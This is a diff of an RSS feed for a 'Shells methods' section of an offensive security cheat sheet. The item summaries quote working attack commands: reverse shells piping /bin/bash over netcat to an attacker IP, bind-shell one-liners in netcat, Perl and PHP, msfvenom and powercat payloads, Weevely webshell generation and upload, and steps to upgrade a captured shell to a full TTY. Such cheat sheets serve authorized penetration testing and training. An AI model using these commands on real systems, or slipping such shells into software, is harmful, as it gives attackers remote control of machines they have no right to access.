@@ -1,15 +1,11 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Shells methods on Offensive Security Cheatsheet</title>
     <link>/shells-methods/</link>
     <description>Recent content in Shells methods on Offensive Security Cheatsheet</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    
-	<atom:link href="/shells-methods/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>en-us</language><atom:link href="/shells-methods/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Methodology</title>
       <link>/shells-methods/methodology/</link>
@@ -17,8 +13,7 @@
       
       <guid>/shells-methods/methodology/</guid>
       <description>https://dolosgroup.io/blog/remote-access-cheat-sheet
-GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
-Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
+GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
     </item>
     
     <item>
@@ -27,8 +22,7 @@ Methodology _ Keep it simple, test for very basic things. | | |________ Which la
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/tty_full/</guid>
-      <description>MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port# Another way to get a better shell # script is almost everytime present on the machine /usr/bin/script -qc /bin/bash /dev/null 
-Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt;</description>
+      <description>MISC # RLWRAP allows you to interface local and remote keyboards # It gives access to keyboard arrows and history rlwrap ncat -lvp port # Another way to get a better shell # script is almost everytime present on the machine /usr/bin/script -qc /bin/bash /dev/null Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt; Spawning a shell # Using os.</description>
     </item>
     
     <item>
@@ -37,7 +31,7 @@ Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/webshell/</guid>
-      <description> Weevely # Weevely is insane ! # It&amp;#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate &amp;lt;password&amp;gt; &amp;lt;filename&amp;gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely &amp;lt;url&amp;gt; &amp;lt;password</description>
+      <description>Weevely # Weevely is insane !  # It&amp;#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate &amp;lt;password&amp;gt; &amp;lt;filename&amp;gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely &amp;lt;url&amp;gt; &amp;lt;password </description>
     </item>
     
     <item>
@@ -46,9 +40,7 @@ Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/reverse/</guid>
-      <description>Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator 
-Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  
-Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
+      <description>Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
     </item>
     
     <item>
@@ -57,10 +49,7 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/bind/</guid>
-      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
-Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asphttps://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 
-Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; 
-PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!</description>
+      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asp https://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&amp;#34;$ &amp;#34;,2))exit;\ $in=socket_read($cl,100);$cmd=popen(&amp;#34;$in&amp;#34;,&amp;#34;r&amp;#34;);while(!feof($cmd)){$m=fgetc($cmd);\ socket_write($cl,$m,strlen($m));}}&amp;#39; Ruby ruby -rsocket -e &amp;#39;f=TCPServer.</description>
     </item>
     
   </channel>
